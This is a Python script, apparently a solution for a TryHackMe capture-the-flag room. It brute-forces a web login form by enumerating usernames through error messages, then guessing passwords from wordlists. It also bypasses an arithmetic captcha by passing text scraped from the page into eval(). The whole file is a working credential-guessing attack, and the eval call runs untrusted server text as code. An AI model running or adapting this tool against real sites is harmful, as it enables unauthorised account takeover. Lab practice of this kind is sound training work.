import requests
import time

# constants

url = "your.box.ip/here"
user_list = "usernames.txt"
pass_list = "passwords.txt"

captcha_signature = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}


class Logger: 
    def print_found(self, key, value):
        '''
    Print input_str around purple excalmation marks to indicate that a value has been found
    :param input_str:
    '''
        print(f"\n!!! {key}\033[1;30;35m {value} \033[0m!!! \n")


    def print_ok(self, input_str):
        '''
    Print input_str in green text to indicate successful response
    :param input_str:
        '''
        print("\033[1;32;40m[+]\033[0m " + input_str)

    def print_info(self, input_str):
        '''
    Print input_str highlighted in blue to indicate new information
    :param input_str:
        '''
        print("\033[1;34;34m[^]\033[0m " + input_str)


logger = Logger()

class Captcha:
    
    @staticmethod
    def check_for_captcha(req_response):
        '''
        Check if captcha has been enabled on website
        :param req_reponse:
        '''
        if captcha_signature in req_response:
            captcha = True
        else:
            captcha = False
        return captcha

    @staticmethod
    def get_captcha_question(web_response):
        '''
        Send request to check if they are valid
        :param data_to_send:
        '''

        lines = web_response.splitlines()
        counter = 0
        for line in lines:
            if captcha_signature in line:
                counter += 1
                captcha_question = lines[counter]
                return captcha_question
            else: 
                counter += 1

    @staticmethod
    def solve_captcha(req_data):
        '''
        Solves captcha with the given website HTML response 
        :param req_data:
        '''
        captcha_question = Captcha.get_captcha_question(req_data)
        num1 = captcha_question.split()[0]
        operator = captcha_question.split()[1]
        num2 = captcha_question.split()[2]
        final_answer = eval(str(num1) + operator + str(num2))
        return final_answer

class Brute:

    @staticmethod
    def send_request(data):
        '''
        Sends a request to the server with all necessary information
        :param data:
        '''
        r = requests.post(url, headers=headers, data=data)
        req_data = r.text
        return req_data
    

    def send_request_with_captcha(data):
        '''
        Send a request with a captcha and return the response
        :param data:
        '''

        req_data = Brute.send_request(data)

        if Captcha.check_for_captcha(req_data):
            captcha_answer = Captcha.solve_captcha(req_data) 
            data['captcha'] = captcha_answer
            updated_req_payload = data
            updated_req = Brute.send_request(updated_req_payload)
            return updated_req
        else:
            return req_data

    @staticmethod
    def brute_force_username(data_to_send):
        '''
        Start brute forcing the username
        :param data_to_send:
        '''

        data = data_to_send
        req_data = Brute.send_request_with_captcha(data)

        if 'does not exist' in req_data:
            return False
        else:
            return data

    @staticmethod
    def brute_force_password(data_to_send):
        '''
        After the correct username has been found, start brute forcing the password
        :param data_to_send:
        '''

        data = data_to_send
        req_data = Brute.send_request_with_captcha(data)

        if 'Invalid password' in req_data:
            return False
        else:
            return True

    
    @staticmethod
    def start_bruting():
        '''
        Pull creds from usernames.txt and passwords.txt - these files can be downloaded from the room @ TryHackMe
        :param:
        '''

        logger.print_ok("Starting brute force on " + url + '\n')

        with open(user_list, "r")  as username_list: 
            usernames = username_list.readlines()

        with open(pass_list, "r")  as password_list: 
            passwords = password_list.readlines()

            logger.print_info(f"Loaded {len(usernames)} usernames...")
            logger.print_info(f"Loaded {len(passwords)} passwords...")

            logger.print_info("Searching for usernames...")

            for user in usernames:
                    data = {"username": user.replace("\n", ""), "password": "comingsoon"}
                    check_user_valid = Brute.brute_force_username(data)
                    if check_user_valid:
                        correct_user = data['username']
                        logger.print_found(f"FOUND USERNAME :", correct_user)
                        break
                    else:
                        pass

            logger.print_info("Searching for passwords...")
            for password in passwords:
                data = {"username": correct_user, "password": password.replace("\n", "")}
                check_pass_valid = Brute.brute_force_password(data)
                if check_pass_valid: 
                    logger.print_found("FOUND PASSWORD :", data['password'])
                    break
            logger.print_ok(f"found {data['username']}:{data['password']} login @ {url}")
                
def main():
    Brute.start_bruting()

main()
